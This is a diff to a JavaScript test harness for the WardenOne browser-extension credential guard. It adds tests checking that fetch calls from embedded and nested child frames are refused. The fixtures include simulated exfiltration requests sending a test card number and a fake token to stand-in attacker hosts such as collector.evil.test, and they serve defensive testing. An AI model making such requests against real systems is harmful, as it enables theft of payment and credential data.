@@ -124,6 +124,10 @@ function makeHarness(options) {
       href: opts.href || 'https://checkout.example/frame',
       hostname: 'checkout.example',
       protocol: 'https:',
+      /* Real ancestorOrigins is a DOMStringList; length + index access is all the
+         guard uses. Empty by default, so a harness that says nothing about its
+         ancestors behaves exactly as it did before this existed. */
+      ancestorOrigins: opts.ancestorOrigins || [],
     },
     navigator: {
       sendBeacon(url, data) { state.beacons.push([url, data]); return true; },
@@ -230,6 +234,38 @@ function makeHarness(options) {
   frame.config.paymentCardGuard = false;
   await frame.sandbox.fetch('https://collector.evil.test/disabled', { body: 'card=4111111111111111' });
   assert.strictEqual(frame.state.fetches.length, 3, 'all three user toggles are honoured in child frames');
+
+  /* A child frame is refused whatever page it sits in -- including a first-party
+     frame of a site the reader trusts. There is no first-party exemption, because
+     content.min.js owns the top frame (all_frames:false) and this block owns the
+     children: exempting them would leave a real gap rather than close an
+     inconsistency. */
+  const thirdParty = makeHarness({
+    href: 'https://widget.evil.test/frame',
+    ancestorOrigins: ['https://discord.com'],
+  });
+  /* A refusal throws rather than resolving, so this has to be awaited as a rejection.
+     Calling it bare made the suite die on the guard working correctly. */
+  await assert.rejects(
+    async () => thirdParty.sandbox.fetch('https://collector.other.test/steal', {
+      body: 'token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
+    }),
+    /Blocked by WardenOne credential guard/,
+    'an embedded third party is still refused, however trusted the page around it');
+  assert.strictEqual(thirdParty.state.fetches.length, 0,
+    'and the request must not reach the network');
+
+  /* Nesting changes nothing either: a frame inside another frame is still refused. */
+  const nested = makeHarness({
+    href: 'https://widget.evil.test/inner',
+    ancestorOrigins: ['https://widget.evil.test', 'https://discord.com'],
+  });
+  await assert.rejects(
+    async () => nested.sandbox.fetch('https://collector.other.test/steal', {
+      body: 'token=abcdefghijklmnopqrstuvwxyz1234567890abcd',
+    }),
+    /Blocked by WardenOne credential guard/,
+    'a frame nested inside its own party must not inherit the top page identity');
 
   const top = makeHarness({ topFrame: true });
   const nativeTopFetch = top.sandbox.fetch;
